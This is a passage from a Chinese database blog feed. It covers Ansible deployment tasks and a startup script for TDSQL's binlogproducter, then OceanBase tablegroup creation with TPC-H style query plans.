class="attr">open</span>=<span class="string">&quot;0&quot;</span> <span class="attr">interval</span>=<span class="string">&quot;30&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">long_trx</span> <span class="attr">open</span>=<span class="string">&quot;1&quot;</span> <span class="attr">interval</span>=<span class="string">&quot;60&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">no_primarykey</span> <span class="attr">open</span>=<span class="string">&quot;1&quot;</span> <span class="attr">interval</span>=<span class="string">&quot;3600&quot;</span> /&gt;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">kafka</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">log</span> <span class="attr">name</span>=<span class="string">&quot;../log/sys_binlogtokafka_&#123;&#123;port&#125;&#125;.log&quot;</span> <span class="attr">log_size</span>=<span class="string">&quot;536870912&quot;</span> <span class="attr">log_level</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h2 id="binlogproducter-的-Ansible-任务">binlogproducter 的 Ansible 任务</h2>
<p>一般情况下，我们只需按照安装手册进行一键部署即可，但是，如果遇到异常情况，需要排错的时候，我们就需要了解详细的安装过程。<br>
阅读安装脚本就是很好的了解途径，比如下面的任务就是安装 binlogproducter 时，所涉及到的具体步骤。<br>
主要分为三个步骤：<br>
第一步，创建目标路径，并将安装包里的安装文件和脚本复制到目标路径下。<br>
第二步，覆盖 binlogproducter 二进制文件。<br>
第三步，将新的 bin 目录下的文件赋予可执行权限。</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">the</span> <span class="string">directory</span></span><br><span class="line">  <span class="attr">shell:</span> <span class="string">&quot;mkdir -p /data/tools /data/application /data1 &amp;&amp; chown -R tdsql:users /data1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">the</span> <span class="string">tdsqlinstall</span> <span class="string">packets</span> <span class="string">to</span> <span class="string">the</span> <span class="string">dst</span> <span class="string">host</span></span><br><span class="line">  <span class="attr">synchronize:</span> <span class="string">src=&quot;&#123;&#123;</span> <span class="string">playbook_dir</span> <span class="string">&#125;&#125;/../../tdsql_packet/tdsql_tdsqlinstall/&quot;</span> <span class="string">dest=/data/tools/</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">the</span> <span class="string">scripts</span> <span class="string">file</span> <span class="string">to</span> <span class="string">the</span> <span class="string">dst</span> <span class="string">host</span></span><br><span class="line">  <span class="attr">synchronize:</span> <span class="string">src=../files/shell_scripts/</span>  <span class="string">dest=/data/tools/</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">overwrite</span> <span class="string">binlogproducter</span></span><br><span class="line">  <span class="attr">shell:</span> <span class="string">&quot;test -e /data/home/tdsql/tdsqlinstall/mysqlagent/bin/binlogproducter &amp;&amp; rm -f /data/home/tdsql/tdsqlinstall/mysqlagent/bin/binlogproducter ; /bin/cp -a /data/tools/binlogproducter /data/home/tdsql/tdsqlinstall/mysqlagent/bin/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">overwrite</span> <span class="string">binlogproducter_percona</span></span><br><span class="line">  <span class="attr">shell:</span> <span class="string">&quot;test -e /data/home/tdsql/tdsqlinstall/mysqlagent/bin/binlogproducter_percona &amp;&amp; rm -f /data/home/tdsql/tdsqlinstall/mysqlagent/bin/binlogproducter_percona ; /bin/cp -a /data/tools/binlogproducter_percona /data/home/tdsql/tdsqli</span></span><br><span class="line"><span class="string">nstall/mysqlagent/bin/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">add</span> <span class="string">privi</span> <span class="string">mysqlagent</span> <span class="string">bin</span></span><br><span class="line">  <span class="attr">shell:</span> <span class="string">&quot;chmod +x -R /data/home/tdsql/tdsqlinstall/mysqlagent/bin&quot;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="binlogproducter-服务启动">binlogproducter 服务启动</h2>
<p>binlogproducter 启动脚本中，设定了 <code>ulimit -c unlimited</code>，对最大进程数不设限。<br>
同时设定了 <code>ulimit -n 200000</code>，提升了该服务可用的最大文件数。<br>
以此来降低操作系统层对 TDSQL 可能面对的大容量数据操作的影响。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">ulimit -c unlimited</span><br><span class="line">ulimit -n 200000</span><br><span class="line">...</span><br><span class="line">./binlogproducter $conffile</span><br></pre></td></tr></table></figure></div>
<h2 id="binlogproducter-小问题一则">binlogproducter 小问题一则</h2>
<p>在实际使用过程中，习惯上都会直接执行 <code>-h/--help</code> 查看帮助说明，但是对于 binlogproducter，这个方法不太适用。<br>
会出现如下报错，且只能通过 <code>kill -9</code> 将服务停止。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./binlogproducter_percona --<span class="built_in">help</span></span></span><br><span class="line">Analyze local config file: --help error:</span><br><span class="line">open file failed, error info: No such file or directory</span><br><span class="line">child process have exit</span><br><span class="line">Analyze local config file: --help error:</span><br><span class="line">open file failed, error info: No such file or directory</span><br><span class="line">child process have exit</span><br><span class="line">Analyze local config file: --help error:</span><br><span class="line">open file failed, error info: No such file or directory</span><br><span class="line">child process have exit</span><br></pre></td></tr></table></figure></div>
<p>这种处理不够优雅，相信官方已经处理，或者在后续版本中处理好。</p>
<h2 id="总结">总结</h2>
<p>从4月11日到21日，共8次课的学习，对于 TDSQL 有了一个全面的概括性的了解。经过动手实际操作，阅读 TDSQL 文档也对 TDSQL 的使用有了更加深入地体会。<br>
从业务隔离、数据整合的角度来说，技术部门必然会接到数据抽取、推送的任务，而使用 TDSQL 的 binlogproducter 就是一个很好的选择，可以很方便的、无损的将线上数据近实时地推送到指定的消息中间件。</p>
<h2 id="相关链接">相关链接</h2>
<ul>
<li><a class="link"   href="https://marketing.csdn.net/p/dc143c1bb8982d9fcb78b5f4dd3ab586" >腾讯云数据库TDSQL征文大赛–参赛页面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<hr>
<p><a class="link"   href="https://blog.csdn.net/breeze915/article/details/124511021" >https://blog.csdn.net/breeze915/article/details/124511021 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tencentcloud.csdn.net/64f838724cd6367bad132690.html" >https://tencentcloud.csdn.net/64f838724cd6367bad132690.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TDSQL</category>
      </categories>
      <tags>
        <tag>percona</tag>
        <tag>tdsql</tag>
        <tag>tencentcloud</tag>
        <tag>tencent</tag>
        <tag>binlog</tag>
        <tag>backup</tag>
      </tags>
  </entry>
  <entry>
    <title>OB测试 | OceanBase 表组（Tablegroup）测试及 OceanBase 自带工具使用示例</title>
    <url>/2022/oceanbase/ob-v3.1.3-perf-testing-tablegroup/</url>
    <content><![CDATA[<h2 id="概述">概述</h2>
<p>本文是前两篇文章 <a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.3-perf-testing-single-node/">《大才能否小用？OceanBase一体化场景测试》</a>、<a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.3-perf-testing-with-dbt-3/">《使用 DBT-3 对 OceanBase 和 MariaDB 进行性能测试对比》</a> 的后续及引申，主要介绍并测试 OceanBase（以下简称“OB”） 中表组（tablegroup）（以下简称“TG”）这一特性，并介绍 OB 自带的两个工具 <code>env_checker.py</code> 和 <code>dooba.py</code>。</p>
<img  alt="ob-tablegroup-word-art.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220429-a58fb6fa-086e-41f3-8f8c-aeda0adcf225.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="OceanBase-的表组（Tablegroup）特性">OceanBase 的表组（Tablegroup）特性</h2>
<p>在 OB 中，关系密切的表，可以通过表组干预它们的分区分布，使表组内所有的同号分区在同一个 Unit 内部，避免跨节点请求对性能的影响。<br>
属于这样一个集合的表，需要满足一定的约束：所有表必须拥有相同的 Locality（副本类型、个数及位置），相同的 Primary Zone（leader 位置及其优先级），以及相同的分区方式。</p>
<p>不过，单节点下表组意义不大，更建议使用在3-3-3的场景下，将关联紧密的表设定为一个表组，从而减少跨zone访问带来的网络延迟。</p>
<p>本文案例是基于前两篇文章的进一步测试及特性演示，所以依旧是在单节点下进行测试。</p>
<h3 id="TableGroup-基本用法">TableGroup 基本用法</h3>
<p>创建TG，添加表到TG，查看TG状态的语法如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>uroot<span class="variable">@tpcc</span> <span class="operator">-</span>h127<span class="number">.1</span> <span class="operator">-</span>P2881 tpcc</span><br><span class="line"></span><br><span class="line"># 创建 tablegroup</span><br><span class="line">oceanbase<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span><span class="keyword">GROUP</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> tg_1;</span><br><span class="line"></span><br><span class="line"># 添加对应的表</span><br><span class="line">oceanbase<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> sbtest1 <span class="keyword">SET</span> TABLEGROUP tg_1;</span><br><span class="line">oceanbase<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> TABLE2 <span class="keyword">SET</span> TABLEGROUP tg_1;</span><br><span class="line"></span><br><span class="line"># 查看 tablegroup</span><br><span class="line">oceanbase<span class="operator">&gt;</span> <span class="keyword">SHOW</span> TABLEGROUPS;</span><br><span class="line">oceanbase<span class="operator">&gt;</span> <span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span><span class="keyword">GROUP</span> tg_1\G</span><br></pre></td></tr></table></figure></div>
<h3 id="为测试表创建表组">为测试表创建表组</h3>
<p>从8张表的关系图，以及 SQL 的执行计划可以看出，<code>customer</code>、<code>orders</code> 和 <code>lineitem</code> 这三张表的关联关系密切，故将这三张表创建为一个表组。</p>
<img  alt="1.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220429-769d8f40-c6bf-4416-8ce4-34f72f0919dd.jpg"
                      referrerpolicy="no-referrer"
                >
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">create</span> tg</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span><span class="keyword">GROUP</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> tg_dbt3;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">add</span> <span class="keyword">table</span> <span class="keyword">into</span> tg</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> customer <span class="keyword">SET</span> TABLEGROUP tg_dbt3;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> orders <span class="keyword">SET</span> TABLEGROUP tg_dbt3;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> lineitem <span class="keyword">SET</span> TABLEGROUP tg_dbt3;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">check</span> tg</span><br><span class="line"><span class="keyword">SHOW</span> TABLEGROUPS;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+----------------------------+---------------+</span></span><br><span class="line"><span class="operator">|</span> Tablegroup_name <span class="operator">|</span> Table_name                 <span class="operator">|</span> Database_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+----------------------------+---------------+</span></span><br><span class="line"><span class="operator">|</span> oceanbase       <span class="operator">|</span> <span class="keyword">NULL</span>                       <span class="operator">|</span> <span class="keyword">NULL</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tg_dbt3         <span class="operator">|</span> customer                   <span class="operator">|</span> tpcc          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tg_dbt3         <span class="operator">|</span> lineitem                   <span class="operator">|</span> tpcc          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tg_dbt3         <span class="operator">|</span> orders                     <span class="operator">|</span> tpcc          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+----------------------------+---------------+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span><span class="keyword">GROUP</span> tg_dbt3\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">       Tablegroup: tg_dbt3</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span><span class="keyword">group</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span><span class="keyword">GROUP</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `tg_dbt3`  BINDING <span class="operator">=</span> <span class="literal">FALSE</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.004</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>创建表组成功后，再次对6个SQL进行测试。</p>
<p>测试数据及执行计划如下。</p>
<h3 id="测试-SQL-的执行计划">测试 SQL 的执行计划</h3>
<h4 id="SQL-1">SQL-1</h4>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR      <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">----------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SORT          <span class="operator">|</span>        <span class="operator">|</span><span class="number">6</span>        <span class="operator">|</span><span class="number">4988325</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">6</span>        <span class="operator">|</span><span class="number">4988308</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">2000405</span>  <span class="operator">|</span><span class="number">3261350</span><span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([lineitem.l_returnflag], [lineitem.l_linestatus], [T_FUN_SUM(lineitem.l_quantity)], [T_FUN_SUM(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax)], [T_FUN_SUM(lineitem.l_quantity) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_quantity), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [T_FUN_SUM(lineitem.l_extendedprice) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_extendedprice), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [T_FUN_SUM(lineitem.l_discount) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_discount), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil), sort_keys([lineitem.l_returnflag, <span class="keyword">ASC</span>], [lineitem.l_linestatus, <span class="keyword">ASC</span>])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([lineitem.l_returnflag], [lineitem.l_linestatus], [T_FUN_SUM(lineitem.l_quantity)], [T_FUN_SUM(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax)], [T_FUN_COUNT(lineitem.l_quantity)], [T_FUN_COUNT(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_discount)], [T_FUN_COUNT(lineitem.l_discount)], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([lineitem.l_returnflag], [lineitem.l_linestatus]), agg_func([T_FUN_SUM(lineitem.l_quantity)], [T_FUN_SUM(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax)], [T_FUN_COUNT(<span class="operator">*</span>)], [T_FUN_COUNT(lineitem.l_quantity)], [T_FUN_COUNT(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_discount)], [T_FUN_COUNT(lineitem.l_discount)])</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([lineitem.l_returnflag], [lineitem.l_linestatus], [lineitem.l_quantity], [lineitem.l_extendedprice], [lineitem.l_discount], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax]), <span class="keyword">filter</span>([<span class="built_in">cast</span>(lineitem.l_shipDATE, DATETIME(<span class="number">-1</span>, <span class="number">-1</span>)) <span class="operator">&lt;=</span> ?]),</span><br><span class="line">      access([lineitem.l_shipDATE], [lineitem.l_returnflag], [lineitem.l_linestatus], [lineitem.l_quantity], [lineitem.l_extendedprice], [lineitem.l_discount], [lineitem.l_tax]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.006</span> sec)</span><br></pre></td></tr></table></figure></div>
<h4 id="SQL-5">SQL-5</h4>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR         <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">-------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SORT             <span class="operator">|</span>        <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">6968243</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span>   <span class="operator">|</span>        <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">6968114</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  HASH <span class="keyword">JOIN</span>      <span class="operator">|</span>        <span class="operator">|</span><span class="number">7348</span>     <span class="operator">|</span><span class="number">6965295</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">3</span> <span class="operator">|</span>   <span class="keyword">TABLE</span> SCAN    <span class="operator">|</span>region  <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">40</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">4</span> <span class="operator">|</span>   HASH <span class="keyword">JOIN</span>     <span class="operator">|</span>        <span class="operator">|</span><span class="number">36737</span>    <span class="operator">|</span><span class="number">6948838</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">5</span> <span class="operator">|</span>    <span class="keyword">TABLE</span> SCAN   <span class="operator">|</span>nation  <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">42</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">6</span> <span class="operator">|</span>    HASH <span class="keyword">JOIN</span>    <span class="operator">|</span>        <span class="operator">|</span><span class="number">36737</span>    <span class="operator">|</span><span class="number">6914905</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">7</span> <span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>supplier<span class="operator">|</span><span class="number">10000</span>    <span class="operator">|</span><span class="number">3973</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">8</span> <span class="operator">|</span>     HASH <span class="keyword">JOIN</span>   <span class="operator">|</span>        <span class="operator">|</span><span class="number">907292</span>   <span class="operator">|</span><span class="number">6522128</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">9</span> <span class="operator">|</span>      HASH <span class="keyword">JOIN</span>  <span class="operator">|</span>        <span class="operator">|</span><span class="number">223710</span>   <span class="operator">|</span><span class="number">1232531</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">10</span><span class="operator">|</span>       <span class="keyword">TABLE</span> SCAN<span class="operator">|</span>customer<span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">62265</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">11</span><span class="operator">|</span>       <span class="keyword">TABLE</span> SCAN<span class="operator">|</span>orders  <span class="operator">|</span><span class="number">228275</span>   <span class="operator">|</span><span class="number">770751</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">12</span><span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">6001215</span>  <span class="operator">|</span><span class="number">2361773</span><span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span 